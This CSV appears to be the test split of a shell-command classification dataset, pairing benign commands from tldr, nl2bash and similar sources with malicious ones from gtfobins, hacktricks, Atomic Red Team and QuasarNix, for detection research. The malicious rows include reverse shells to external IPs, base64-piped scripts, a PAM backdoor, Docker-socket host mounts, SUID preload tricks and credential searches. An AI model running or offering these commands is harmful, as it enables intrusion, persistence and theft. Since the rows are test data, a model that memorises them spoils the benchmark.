id,command,label,source,split
d1_005717,yay -S weaviate,0,linlm,test
d1_005722,echo IyEvYmluL3NoCmVjaG8gImh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL0BhdG9taWNzb25hZnJpZGF5IEZUVyIK | base64 -d | bash,1,atomic_red_team,test
d1_005730,ip netns delete bar,1,gtfobins,test
d1_005735,egrep -o '$6$w{8}S{86}' *.txt > sha512crypt.txt,1,hacktricks,test
d1_005740,highlight [-o|--out-format] html --print-style [-s|--style] theme_name [-S|--syntax] language --stdout,0,tldr,test
d1_005747,pod update pod_name,0,tldr,test
d1_005750,find assets -type f -size 100M,0,bash_instruct,test
d1_005752,nc -e /usr/bin/bash 83.119.42.130 12934,1,quasarnix,test
d1_005758,"find . -maxdepth 1 -iname ""*linkin park*""",0,nl2bash,test
d1_005760,"echo ""Hello\nWorld!"" | pbmtext [-s|-space] 3 [-ls|-lspace] 10 > path/to/output.pbm",0,tldr,test
d1_005782,find / -type f -print | xargs file,0,nl2bash,test
d1_005796,cat credentials.conf | tr 'a-z' 'A-Z',0,bash_instruct,test
d1_005803,strings /tmp/mem_ftp,1,hacktricks,test
d1_005804,cat inventory.csv | tr ' ' '\n' | sort | uniq -c | sort -nr | head -n 5,0,bash_instruct,test
d1_005805,mv error.md error.md.old,0,bash_instruct,test
d1_005814,"curl --unix-socket /var/run/docker.sock -H ""Content-Type: application/json"" -d '{""Image"":""ubuntu:24.04"",""Binds"":[""/:/host""]}' http:/v1.41/containers/create",1,hacktricks,test
d1_005818,find -regex '^.*/[A-Za-z]+-[0-9]+x[0-9]+\.[A-Za-z]+$' | xargs echo rm -f,0,nl2bash,test
d1_005821,wc -l account.js,0,bash_instruct,test
d1_005829,"parse_csv() { csv_file=$1; columns=$2; awk -v cols=$columns -F, '{print $cols}' $csv_file > parsed_csv.txt; awk '{sum+=$1} END {print sum}' parsed_csv.txt > sum.txt }; parse_csv data.csv '1,3'",0,bash6k,test
d1_005839,loft delete vcluster vcluster_name,0,tldr,test
d1_005844,mv -n response.sql response.sql.old,0,bash_instruct,test
d1_005846,rsync -av tmp/ static/,0,bash_instruct,test
d1_005848,chmod +x metrics.tmp,0,bash_instruct,test
d1_005854,./mvnw compile quarkus:dev,0,linlm,test
d1_005855,freeze path/to/file [-o|--output] path/to/output_image.png,0,tldr,test
d1_005857,fossil [ci|commit],0,tldr,test
d1_005869,idnits --verbose path/to/file.txt,0,tldr,test
d1_005879,"csslint --warnings=box-sizing,selector-max,floats file.css",0,tldr,test
d1_005885,lxc exec privesc /bin/sh,1,hacktricks,test
d1_005889,mv archive.yaml archive.yaml.old,0,bash_instruct,test
d1_005892,systemctl list-sockets --show-types,0,tldr,test
d1_005895,cat access.yaml | tr 'a-z' 'A-Z',0,bash_instruct,test
d1_005898,nl notes.xml,0,bash_instruct,test
d1_005899,pspy64,1,hacktricks,test
d1_005911,"echo ""\t192.168.1.$i has port $j open"";",1,payloads,test
d1_005913,"php -r '$c=fsockopen(""18.153.92.123"",54967);exec(""/bin/bash <&3 >&3 2>&3"");'",1,quasarnix,test
d1_005920,"rsync -e '/bin/sh -p -c ""/bin/sh -p 0<&2 1>&2""' x:x",1,gtfobins,test
d1_005925,"find /etc -type f -perm -o=w -ls | awk '{print $3,$5,$11}' # To fix: find /etc -type f -perm -o=w -exec chmod o-w {} \;",0,bash6k,test
d1_005948,"podman import [-m|--message] ""commit_message"" path/to/tarball.tar image:tag",0,tldr,test
d1_005957,"echo ""ACTION==\""add\"",ENV{DEVTYPE}==\""usb_device\"",SUBSYSTEM==\""usb\"",RUN+=\""$RSHELL\"""" | tee /etc/udev/rules.d/71-vbox-kernel-drivers.rules > /dev/null",1,payloads,test
d1_005960,dog example.com MX,0,tldr,test
d1_005961,vzdump --all --mode suspend --mailto root --mailto admin,0,tldr,test
d1_005965,rmdir logs,0,bash_instruct,test
d1_005966,"find ""/path/to/pdfs/"" -type f -name ""$1*.pdf"" -exec stat -f ""%10Dm %SN"" {}\; | sort -k1,1n -k2,2",0,nl2bash,test
d1_005967,"egrep -a -o ""\bISBN(?:-1[03])?:? (?=[0-9X]{10}$|(?=(?:[0-9]+[- ]){3})[- 0-9X]{13}$|97[89][0-9]{10}$|(?=(?:[0-9]+[- ]){4})[- 0-9]{17}$)(?:97[89][- ]?)?[0-9]{1,5}[- ]?[0-9]+[- ]?[0-9]+[- ]?[0-9X]\b"" *.txt > isbn.txt",1,hacktricks,test
d1_005968,tldr jira open,0,tldr,test
d1_005969,"egrep -o ""([0-9a-zA-Z]{32}):(w{16,32})"" *.txt > joomla.txt",1,hacktricks,test
d1_005971,find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20,1,hacktricks,test
d1_005972,ansible-doc [-j|--json] plugin_name,0,tldr,test
d1_005973,find -type f | xargs -I {} mv {} {}.txt,0,nl2bash,test
d1_005981,pass edit path/to/data,0,tldr,test
d1_005983,jwt encode [-A|--alg] HS256 [-S|--secret] 1234567890 [-P|--payload] key=value,0,tldr,test
d1_005985,sudo sed -i 's/<listen-address>7.98.246.159</listen-address>/<listen-address>76.132.177.92</listen-address>/' /etc/orientdb/config/orientdb-server-config.xml,0,linlm,test
d1_005993,packtpub whoami,0,tldr,test
d1_005997,stack --version,0,linlm,test
d1_006009,systemd-detect-virt [-c|--container],0,tldr,test
d1_006010,mv *.tmp public/,0,bash_instruct,test
d1_006013,systemd-dissect --attach path/to/image.raw,0,tldr,test
d1_006025,hledger [bal|balance] expenses [-t|--tree] [-2|--depth 2],0,tldr,test
d1_006027,</>*.pdf,0,tldr,test
d1_006031,"qm [se|set] 100 --delete device_name0,device_name1,...",0,tldr,test
d1_006032,sudo pacman -S celluloid,0,linlm,test
d1_006034,info torrent_id,0,tldr,test
d1_006041,jigsaw serve build_production,0,tldr,test
d1_006045,openssl rand -base64 12 | cut -c1-16,0,bash6k,test
d1_006050,/usr/bin/ping = cap_net_raw+ep,1,hacktricks,test
d1_006061,hping3 --icmp --listen xxx --dump,1,gtfobins,test
d1_006063,snmpbulkget [-h|--help],0,tldr,test
d1_006065,cat /sys/block/sda/queue/scheduler,0,linlm,test
d1_006066,virsh -c qemu:///system vol-upload --pool x /path/to/output-dir/output-file /path/to/temp-file,1,gtfobins,test
d1_006069,"lshw -class cpu|grep ""^ width""|uniq|awk '{print $2}'",0,nl2bash,test
d1_006070,cat migration.ini | sort | uniq -c | sort -nr,0,bash_instruct,test
d1_006081,find | perl -lne 'print quotemeta' | xargs ls -d,0,nl2bash,test
d1_006084,"{cat,lol.txt}",1,hacktricks,test
d1_006087,etcdctl < path/to/file.txt put my/file,0,tldr,test
d1_006089,type -p command,0,tldr,test
d1_006092,c:close();,1,gtfobins,test
d1_006101,socket -svp '/bin/sh -i' 12345,1,gtfobins,test
d1_006105,xxd -l 64 users.csv,0,bash_instruct,test
d1_006109,"mkdir -p /var/spool/mail/copy; for file in /var/spool/mail/*; do if [ ""$(basename ""$file"")"" != ""copy"" ]; then cp -R ""$file"" /var/spool/mail/copy/; if [ -f ""/var/spool/mail/copy/$(basename ""$file"")"" ]; then echo ""Modification for Atomic Red Test"" >> ""/var/spool/mail/copy/$(basename ""$file"")""; fi; fi; done",1,atomic_red_team,test
d1_006112,awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -nr | head -n 10 # output: count IP,0,bash6k,test
d1_006114,banner,0,tldr,test
d1_006117,cat order.txt,0,nl2bash,test
d1_006120,"docker build --secret id=my_key,src=path/to/my_secret_file .",1,hacktricks,test
d1_006125,for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do,1,hacktricks,test
d1_006127,grep 'error' log.txt,0,bash6k,test
d1_006128,cat invoice.tsv | sort | uniq,0,bash_instruct,test
d1_006135,cd bar1 find . -maxdepth 1 -name '*foo*' -not -name '*.cc' -exec echo ln -s $PWD/{} ../bar2,0,nl2bash,test
d1_006140,conda clean [-f|--force-pkgs-dirs],0,tldr,test
d1_006143,wireshark,1,gtfobins,test
d1_006146,postcss path/to/file [-d|--dir] path/to/directory,0,tldr,test
d1_006150,espeak -qXf /path/to/input-file,1,gtfobins,test
d1_006157,chmod 644 catalog.html,0,bash_instruct,test
d1_006158,awk '{print $5}' report.csv | sort | uniq -c | sort -nr | head -n 25,0,bash_instruct,test
d1_006163,rdiff-backup restore path/to/backup path/to/destination,0,tldr,test
d1_006170,mkdocs build,0,tldr,test
d1_006173,pwn version,0,tldr,test
d1_006185,qtile check,0,tldr,test
d1_006194,falcon-reload,0,linlm,test
d1_006198,rawtherapee,0,linlm,test
d1_006199,pkill apache2,0,bash_instruct,test
d1_006200,find ./ -type f | tee /tmp/grep1 /tmp/grep2 >/dev/null,0,nl2bash,test
d1_006203,wc -l summary.log,0,bash_instruct,test
d1_006217,find ~/ -newer alldata.tar -exec tar uvf alldata.tar {} ;,0,nl2bash,test
d1_006221,sar -B 5,0,tldr,test
d1_006222,dmesg -r,0,bash_instruct,test
d1_006223,mkdir ${CGROUP_MOUNT},1,hacktricks,test
d1_006226,cp -r docs docs_copy,0,bash_instruct,test
d1_006227,systemsetup -setremotelogin on,0,tldr,test
d1_006245,csvtool trim t /path/to/temp-file -o /path/to/output-file,1,gtfobins,test
d1_006256,"dmesg 2>/dev/null | grep ""signature""",1,hacktricks,test
d1_006257,f:write(d);,1,gtfobins,test
d1_006266,rcat 81.143.187.148 443 -r bash,1,quasarnix,test
d1_006268,mv -n sales.bak sales.bak.old,0,bash_instruct,test
d1_006269,adscript --llvm-ir --output path/to/file.ll path/to/input_file.adscript,0,tldr,test
d1_006275,rmdir old_logs,0,bash6k,test
d1_006279,"grep -E ""(user|username|login|pass|password|pw|credentials)[=:]"" /etc/fstab /etc/mtab 2>/dev/null",1,hacktricks,test
d1_006283,cp summary.tmp assets/,0,bash_instruct,test
d1_006297,sudo chown -R mysql:admin public,0,bash_instruct,test
d1_006299,wc -l /tmp/f,1,hacktricks,test
d1_006301,tig blame path/to/file,0,tldr,test
d1_006306,cat request.tsv | sort | uniq,0,bash_instruct,test
d1_006310,rmdir nonsense_dir,0,nl2bash,test
d1_006316,cat -A results.md,0,bash_instruct,test
d1_006321,chrt 1 /bin/sh -p,1,gtfobins,test
d1_006327,"find -name ""*.txt"" -print0 | xargs -0 rm",0,nl2bash,test
d1_006328,du -h config/* 2>/dev/null | sort -rh | head -n 20,0,bash_instruct,test
d1_006337,find cache -type f -name '*.old' -print0 | xargs -0 cat | wc -l,0,bash_instruct,test
d1_006339,cat migration.tsv | grep -v '^$',0,bash_instruct,test
d1_006340,mkdir fixtures,0,bash_instruct,test
d1_006341,"dbus-monitor ""type=error"" ""sender=org.freedesktop.SystemToolsBackends""",1,hacktricks,test
d1_006342,konsole --background-mode,0,tldr,test
d1_006343,i2cset -y i2cbus device_address register_address value,0,tldr,test
d1_006344,rawtopgm width height -bpp 1|2 [-l|-littleendian] path/to/image.raw > path/to/output.pgm,0,tldr,test
d1_006346,"ps -eo pid,rss,comm --sort=-rss | awk '$2>512000 {print $1,$2,$3}' | while read pid mem cmd; do echo ""Killing $cmd (PID $pid, RSS ${mem}KB)""; kill $pid; sleep 10; if kill -0 $pid 2>/dev/null; then echo ""Force killing $pid""; kill -9 $pid; fi; done >> /var/log/highmem_kill.log 2>&1",0,bash6k,test
d1_006348,bash vst-install.sh,0,linlm,test
d1_006349,"retry(){ local attempts=0 max=5 delay=1; while ((attempts<max)); do ""$@"" && return 0; ((attempts++)); echo ""Attempt $attempts failed, retrying in $delay seconds...""; sleep $delay; ((delay*=2)); done; return 1; } # Usage: retry curl -sSf https://h0caaf24a.example.net",0,bash6k,test
d1_006389,sudo mkdir /var/svn,0,nl2bash,test
d1_006395,start-stop-daemon -S -x /bin/sh -- -p,1,gtfobins,test
d1_006399,lslogins [-u|--user-accs],0,tldr,test
d1_006402,find . -type f -daystart -mtime $date_dif -exec copy_it.sh $verbose -s {} -t $to_dir \;,0,nl2bash,test
d1_006404,stat sales.pdf,0,bash_instruct,test
d1_006413,echo /path/to/input-file | cpio -dp .,1,gtfobins,test
d1_006415,which ctr,1,hacktricks,test
d1_006416,cat -n order.csv,0,bash_instruct,test
d1_006418,sed 's/^[[:space:]]*//' credentials.ini > clean.txt,0,bash_instruct,test
d1_006422,sudo visudo -c -f /usr/local/etc/sudoers,1,atomic_red_team,test
d1_006425,tail -n 25 build.log,0,bash_instruct,test
d1_006427,find . -name foo.txt 1> tmpfile && mv `cat tmpfile` path/to/some/dir && rm tmpfile,0,nl2bash,test
d1_006433,LD_PRELOAD=/tmp/proof.so /path/to/suid-binary,1,hacktricks,test
d1_006441,pstree -p $(pgrep -o systemd),0,bash_instruct,test
d1_006442,cp -u export.js fixtures/,0,bash_instruct,test
d1_006454,sudo chown -R mysql:users backup,0,bash_instruct,test
d1_006457,kjv Matthew 1:7-2:6,0,tldr,test
d1_006461,rpm -ivh x-1.0-1.noarch.rpm,1,gtfobins,test
d1_006469,gradle init --dsl groovy|kotlin,0,tldr,test
d1_006470,[ -f credentials.log ] && cat credentials.log || echo 'not found',0,bash_instruct,test
d1_006472,cp -p account.jpg logs/,0,bash_instruct,test
d1_006486,find . -name '*.php' -print0 -o -name '*.xml' -print0 -o -name '*.phtml' -print0 | xargs -0 sed -i '' 's/2013 Magento Inc./2012 Magento Inc./g',0,nl2bash,test
d1_006495,expand -t4 input.txt > output.txt,0,bash6k,test
d1_006497,cat invoice.csv | sort | uniq -c | sort -nr,0,bash_instruct,test
d1_006498,sudo chown tomcat payment.old,0,bash_instruct,test
d1_006517,"sed -n '10,20p' settings.ini",0,bash_instruct,test
d1_006520,lsof 2>/dev/null | grep deleted | head -n 50,1,hacktricks,test
d1_006522,w3m https://h0caaf24a.example.net -no-mouse,0,tldr,test
d1_006531,tail,1,hacktricks,test
d1_006537,cat /proc/self/gid_map 2>/dev/null,1,hacktricks,test
d1_006540,[ -f changelog.conf ] && cat changelog.conf || echo 'not found',0,bash_instruct,test
d1_006544,find / -mtime +50 –mtime -100,0,nl2bash,test
d1_006546,nc -eu /usr/bin/bash 172.155.153.157 8000,1,quasarnix,test
d1_006548,cat customer.conf | wc -l,0,bash_instruct,test
d1_006552,fin project start,0,tldr,test
d1_006563,wc -l data.json,0,bash_instruct,test
d1_006573,find / -name findme.txt -type f -print,0,nl2bash,test
d1_006574,bun [c|create] path/to/template path/to/destination,0,tldr,test
d1_006580,autoflake --remove-unused-variables --in-place path/to/file.py,0,tldr,test
d1_006585,killall -INT process_name,0,tldr,test
d1_006586,"lsns [-o|--output] NS,TYPE,PID,COMMAND",0,tldr,test
d1_006591,magick path/to/input_image.png -resize 50% path/to/output_image.png,0,tldr,test
d1_006592,CapPrm: 0000003fffffffff,1,hacktricks,test
d1_006598,nix profile add nixpkgs#pkg1 nixpkgs#pkg2 ...,0,tldr,test
d1_006601,bun pm hash,0,tldr,test
d1_006614,sftp adversary@adversary-host:/tmp/adversary-sftp /tmp/victim-files/,1,atomic_red_team,test
d1_006617,tex --shell-escape '\immediate\write18{/bin/sh}',1,gtfobins,test
d1_006619,sudo extrepo disable repository_name,0,tldr,test
d1_006622,mkdir -p build/2026/logs,0,bash_instruct,test
d1_006641,sed -i 's/old/new/g' filename,0,linlm,test
d1_006643,diskonaut --disable-delete-confirmation,0,tldr,test
d1_006646,find / -name document -print,0,nl2bash,test
d1_006647,me=$(readlink --canonicalize --no-newline $BASH_SOURCE),0,nl2bash,test
d1_006649,"grep -oE 'https?://[^[:space:]]+' index.html | sed 's/""//g' > extracted_urls.txt",0,bash6k,test
d1_006662,dvc fetch target/s,0,tldr,test
d1_006663,find /etc/apparmor.d/ -maxdepth 1 -name '*docker-default*' 2>/dev/null,1,hacktricks,test
d1_006668,scp transaction.csv deploy@git.internal:/tmp/,0,bash_instruct,test
d1_006670,gh workflow enable|disable id|workflow_name|filename.yml,0,tldr,test
d1_006671,ls -A /tmp | wc -l,0,bash6k,test
d1_006673,bundletool dump manifest --bundle path/to/bundle.aab --xpath /manifest/@android:versionCode,0,tldr,test
d1_006683,"find . -type f -name '*.log' -mtime +30 -print0 | while IFS= read -r -d '' f; do dest=""/archive/logs${f%.*}.log.bz2""; mkdir -p ""$(dirname ""$dest"")""; bzip2 -c ""$f"" > ""$dest"" && rm ""$f""; done",0,bash6k,test
d1_006684,chmod 744 access.js,0,bash_instruct,test
d1_006690,nxplayer,0,linlm,test
d1_006692,uniq error.conf,0,bash_instruct,test
d1_006698,"""rw"",",1,hacktricks,test
d1_006702,trust subcommand --help,0,tldr,test
d1_006709,lwp-request -m GET http://h0caaf24a.example.net/some/path,0,tldr,test
d1_006713,"echo ""ExecStart=/bin/bash -c ""id > /tmp/atomic_tmp_output.txt"""" >> /tmp/atomic_tmp.service",1,atomic_red_team,test
d1_006716,clamscan [-r|--recursive] path/to/directory,0,tldr,test
d1_006717,scp summary.tmp redis@staging.example.com:/tmp/,0,bash_instruct,test
d1_006719,python -W error script.py,0,linlm,test
d1_006722,"octave-cli --eval 'format none; fid = fopen(""/path/to/input-file""); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'",1,gtfobins,test
d1_006726,mkfs.erofs --all-root image.erofs root/,0,tldr,test
d1_006730,"cat notes.txt | awk '{ print length, $0 }' | sort -rn | head -20 | cut -d' ' -f2-",0,bash_instruct,test
d1_006734,vim path/to/file,0,tldr,test
d1_006743,cat product.conf | sort | uniq -c | sort -nr,0,bash_instruct,test
d1_006745,cp -p inventory.zip artifacts/,0,bash_instruct,test
d1_006764,echo '...' >/path/to/temp-file,1,gtfobins,test
d1_006769,cgexec -g controller:cgroup_name process_name,0,tldr,test
d1_006773,scp svc-app@backup.corp.net:/var/log/access.log .,0,bash_instruct,test
d1_006778,"sudo sed -i ""1s,^,auth sufficient /tmp/pam_evil.so\n,g"" /etc/pam.d/su-l",1,atomic_red_team,test
d1_006781,sudo chmod 755 .git/hooks/pre-commit,0,nl2bash,test
d1_006787,cp product.json uploads/,0,bash_instruct,test
d1_006791,chmod --reference version2/somefile version1/somefile,0,nl2bash,test
d1_006792,uprecords -w,0,tldr,test
d1_006798,chmod +x report.log,0,bash_instruct,test
d1_006805,hostname -d,0,bash_instruct,test
d1_006806,ls -lh public,0,bash_instruct,test
d1_006807,grep -a '@' /proc/net/unix,1,hacktricks,test
d1_006808,mp3info -i path/to/file.mp3,0,tldr,test
d1_006813,lpadmin -p printer -r class,0,tldr,test
d1_006815,crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null,1,hacktricks,test
d1_006817,ls -la /bin/bash,1,hacktricks,test
d1_006824,slim build image:tag,0,tldr,test
d1_006832,while true; do date; sleep 300; done,0,bash6k,test
d1_006834,sudo systemctl restart prometheus,0,bash_instruct,test
d1_006838,cp users.bak users.bak.bak,0,bash_instruct,test
d1_006840,ls -la ~ | grep -iE 'history|credential|token|key|secret',1,hacktricks,test
d1_006841,pulseaudio --dump-modules,0,tldr,test
d1_006853,bun test --watch,0,tldr,test
d1_006854,find . -name custlist\* | perl -ne '$path = $_; s?.*/??; $name = $_; $map{$name} = $path; ++$c; END { print $map{(sort(keys(%map)))[$c-1]} }',0,nl2bash,test
d1_006855,gitleaks detect [-s|--source] path/to/repository --config-path path/to/config.toml,0,tldr,test
d1_006859,sed 's/cron/7.98.246.159/g' payment.csv,0,bash_instruct,test
d1_006861,readlink /proc/1/ns/mnt,1,hacktricks,test
d1_006863,ls -ld /proc/kcore /proc/keys /proc/timer_list /sys/firmware 2>/dev/null,1,hacktricks,test
d1_006866,pngcheck -s path/to/image.png,0,tldr,test
d1_006872,cat invoice.log | sort -u,0,bash_instruct,test
d1_006874,ln -s access.yaml latest.log,0,bash_instruct,test
d1_006877,"sudo hwclock --set --date=""2024-01-15 10:30:00""",0,linlm,test
d1_006878,xclip -o > history.txt,1,atomic_red_team,test
d1_006879,"sync --list-only --include ""*2012*.xml"" -exclude ""*.xml"" serveripaddress::pt/dir/files/ --port=111 | awk '{ $1=$2=$3=$4=""""; print substr($0,5); }' >output.txt",0,nl2bash,test
d1_006883,[ -f output.json ] && cat output.json || echo 'not found',0,bash_instruct,test
d1_006884,xinput list-props id,0,tldr,test
d1_006888,cat /usr/src/app/.env 2>/dev/null,1,hacktricks,test
d1_006902,cat output.ini | tail -n 15,0,bash_instruct,test
d1_006906,"find . -iname '.#*' -print0 | while read -r -d '' i; do foobar ""$i""; done",0,nl2bash,test
d1_006909,head -n 20 account.tar.gz,0,bash_instruct,test
d1_006912,passwd ARTUser #enter admin password > enter new password > confirm new password,1,atomic_red_team,test
d1_006914,sockstat -G gid|group,0,tldr,test
d1_006929,cat /proc/cpuinfo | grep bugs,0,linlm,test
d1_006938,find / -type f -name dummy 2>/dev/null -exec cat {} \; >tesst.txt,0,nl2bash,test
d1_006941,env [-u|--unset] variable program,0,tldr,test
d1_006952,mv -n users.bak users.bak.old,0,bash_instruct,test
d1_006960,"find . -name ""*.py"" -exec wc -l {} \; | awk '{ SUM += $0} END { print SUM }'",0,nl2bash,test
d1_006961,"echo ""python3 -c \""import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgYSBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLm1vZGlmaWNhdGlvbicpCg=='))\"""" | sudo tee -a /etc/init.d/T1543.002",1,atomic_red_team,test
d1_006963,rsync [-zvhP|--compress --verbose --human-readable --partial --progress] path/to/source path/to/destination,0,tldr,test
d1_006975,"cut -d, -f1 sales.tsv | sort | uniq -c | sort -nr | head -n 10",0,bash_instruct,test
d1_006976,echo IyEvYmluL3NoCmVjaG8gImh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL0BhdG9taWNzb25hZnJpZGF5IEZUVyIK | b64decode -r | sh,1,atomic_red_team,test
